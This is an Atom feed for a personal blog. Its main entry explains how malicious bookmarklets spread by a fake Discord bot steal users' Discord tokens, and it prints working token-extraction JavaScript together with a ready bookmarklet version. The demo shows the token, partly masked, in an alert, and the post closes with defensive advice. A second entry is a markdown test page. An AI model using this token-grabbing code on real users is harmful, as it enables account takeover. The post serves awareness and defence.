@@ -1,0 +1,125 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title>y3ll0w</title>
+	<link href="https://y3ll0wlife.github.io/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="https://y3ll0wlife.github.io"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2022-05-23T00:00:00+00:00</updated>
+	<id>https://y3ll0wlife.github.io/atom.xml</id>
+	<entry xml:lang="en">
+		<title>How bookmarks can steal your Discord Token</title>
+		<published>2022-05-23T00:00:00+00:00</published>
+		<updated>2022-05-23T00:00:00+00:00</updated>
+		<link href="https://y3ll0wlife.github.io/posts/discord-token-stealing/" type="text/html"/>
+		<id>https://y3ll0wlife.github.io/posts/discord-token-stealing/</id>
+		<content type="html">&lt;h2 id=&quot;what-are-bookmarklets&quot;&gt;What are &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Bookmarklet&quot;&gt;Bookmarklets&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A bookmarklet is a bookmark stored in a web browser that contains JavaScript commands that add new features to the browser. They are stored as the URL of a bookmark in a web browser or as a hyperlink on a web page. Bookmarklets are usually small snippets of JavaScript executed when user clicks on them. When clicked, bookmarklets can perform a wide variety of operations, such as running a search query from selected text or extracting data from a table. &lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Bookmarklets are a fantastic way for developers to do simple tasks on websites with the help of the javascript on the website but can also be used for nefarious reasons as shown in this article. Bookmarklets can execute any form of javascript code given to it and also bypass &lt;a href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;CSP&quot;&gt;Content Security Policy (CSP)&lt;&#x2F;a&gt; which is used to protect you on the web.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;what-can-happen-on-discord&quot;&gt;What can happen on Discord?&lt;&#x2F;h2&gt;
+&lt;p&gt;This attack vector makes it possible for users to execute arbitrary javascript code on any site, including Discord which can expose your user token (the unique code to your Discord account). &lt;&#x2F;p&gt;
+&lt;p&gt;On a post made on Reddit &lt;a href=&quot;https:&#x2F;&#x2F;www.reddit.com&#x2F;r&#x2F;discordapp&#x2F;comments&#x2F;uv7w5j&#x2F;brilliant_method_get_compromised_without_giving&#x2F;&quot;&gt;Brilliant Method, Get compromised without giving credentials by dragging in bookmark | Dyno Premium Custom Embed misused to verify on a fake dyno domain&lt;&#x2F;a&gt; by &lt;a href=&quot;https:&#x2F;&#x2F;www.reddit.com&#x2F;user&#x2F;Meister-9667&#x2F;&quot;&gt;u&#x2F;Meister-9667&lt;&#x2F;a&gt;, we can see that a faked version of the popular Discord bot Dyno is used to trick users into adding the bookmarklet to their bookmarks and pressing it as a way to identify themselves on the server.
+&lt;img src=&quot;https:&#x2F;&#x2F;cdn.discordapp.com&#x2F;attachments&#x2F;928757369767354369&#x2F;978387128193019954&#x2F;ezgif.com-gif-maker.gif&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;What happens here is that the user is unknowingly giving the attacker their user token.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;how-does-this-work&quot;&gt;How does this work?&lt;&#x2F;h2&gt;
+&lt;p&gt;Here below you can see a simple version of a token grabber that makes a popup on the screen with the two last parts of the token censored.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#0f1419;color:#bfbab0;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;webpackChunkdiscord_app&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;([
+&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#f29668;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;random&lt;&#x2F;span&gt;&lt;span&gt;()]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;    {}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;       token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#39bae6;&quot;&gt;Object&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;values&lt;&#x2F;span&gt;&lt;span&gt;(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;c)
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exports &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exports&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;default &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exports&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;getToken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;!== void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exports&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;getToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;alert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;`${&lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;(&amp;quot;.&amp;quot;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;]}.██.███████`&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#5c6773;&quot;&gt;&#x2F;&#x2F; parts of the token is censored
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;But we can convert the following code to a bookmarklet to test it out. Here below is the above code in a bookmarklet-friendly syntax. Now we can add this to our browser and press it on the Discord website and boom you lost access to your account.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#0f1419;color:#bfbab0;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#59c2ff;&quot;&gt;javascript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span&gt;()%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;Blet&lt;&#x2F;span&gt;&lt;span&gt;%20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;BwebpackChunkdiscord_app&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;(%5B%5BMath.random()%5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;C&lt;&#x2F;span&gt;&lt;span&gt;%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;B&lt;&#x2F;span&gt;&lt;span&gt;%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;Cr&lt;&#x2F;span&gt;&lt;span&gt;%20%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E&lt;&#x2F;span&gt;&lt;span&gt;%20%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;Btoken&lt;&#x2F;span&gt;&lt;span&gt;%20%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;Object&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;values&lt;&#x2F;span&gt;&lt;span&gt;(r.c).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;m&lt;&#x2F;span&gt;&lt;span&gt;%20%3D%3E%20m.exports%20%26%26%20m.exports.default%20%26%26%20m.exports.default.getToken%20!%3D%3D%20void%200).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;exports&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;getToken&lt;&#x2F;span&gt;&lt;span&gt;()%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;B&lt;&#x2F;span&gt;&lt;span&gt;%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;C&lt;&#x2F;span&gt;&lt;span&gt;%5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;)%3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;Balert&lt;&#x2F;span&gt;&lt;span&gt;(%60%24%7Btoken.split(%22.%22)%5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;B0&lt;&#x2F;span&gt;&lt;span&gt;%5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;.%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88.%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;E2&lt;&#x2F;span&gt;&lt;span&gt;%96%88%60)%7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;)()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.discordapp.com&#x2F;attachments&#x2F;928757369767354369&#x2F;977938749923156068&#x2F;iCbGIkjVAl3cjXD.gif&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;so-what-can-be-done&quot;&gt;So what can be done?&lt;&#x2F;h2&gt;
+&lt;p&gt;Simple, don&#x27;t put bookmarks you don&#x27;t trust. If a bot offers this as a way of verification you should imminently be suspicious and conclude that it&#x27;s most likely a way to scam you.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Markdown test</title>
+		<published>1333-01-01T00:00:00+00:00</published>
+		<updated>1333-01-01T00:00:00+00:00</updated>
+		<link href="https://y3ll0wlife.github.io/testing/markdown/" type="text/html"/>
+		<id>https://y3ll0wlife.github.io/testing/markdown/</id>
+		<content type="html">&lt;h1 id=&quot;h1&quot;&gt;H1&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;h2&quot;&gt;H2&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;h3&quot;&gt;H3&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;h4&quot;&gt;H4&lt;&#x2F;h4&gt;
+&lt;h5 id=&quot;h5&quot;&gt;H5&lt;&#x2F;h5&gt;
+&lt;p&gt;&lt;strong&gt;Bold Text&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+&lt;em&gt;Italic text&lt;&#x2F;em&gt;&lt;br &#x2F;&gt;
+&lt;del&gt;Strikethrough&lt;&#x2F;del&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Underline&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+&lt;em&gt;&lt;strong&gt;Bold Italics&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;&lt;em&gt;Underline Italics&lt;&#x2F;em&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;&lt;strong&gt;Underline Bold&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;&lt;em&gt;&lt;strong&gt;Underline Bold Italics&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;My&lt;&#x2F;li&gt;
+&lt;li&gt;Cool&lt;&#x2F;li&gt;
+&lt;li&gt;List&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;ul&gt;
+&lt;li&gt;My&lt;&#x2F;li&gt;
+&lt;li&gt;Other&lt;&#x2F;li&gt;
+&lt;li&gt;List&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;code-blocks&quot;&gt;Code Blocks&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;py&quot; style=&quot;background-color:#0f1419;color:#bfbab0;&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;my_function_call&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;my_variable&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;{my_variable&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;my_cool_statement &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07178;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;Hello World&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;my_function_call&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;yeet&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#0f1419;color:#bfbab0;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;lt;iostream&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;lt;string&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;using namespace&lt;&#x2F;span&gt;&lt;span&gt; std&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffb454;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;        string yeet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;       
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) yeet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;Fizz&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) yeet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;Buzz&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(yeet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c2d94c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; yeet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; endl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt; cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29668;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; endl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff7733;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bfbab0cc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;quote-tag&quot;&gt;Quote Tag&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I made this thing I swear &lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Every developer ever&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It even supports multiple lines aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;code-parts&quot;&gt;Code parts?&lt;&#x2F;h2&gt;
+&lt;p&gt;My &lt;code&gt;cool&lt;&#x2F;code&gt; text that includes &lt;code&gt;stuff&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;links&quot;&gt;Links&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Fizz_buzz&quot;&gt;Fizz Buzz&lt;&#x2F;a&gt; is actully a good way to learn coding&lt;br &#x2F;&gt;
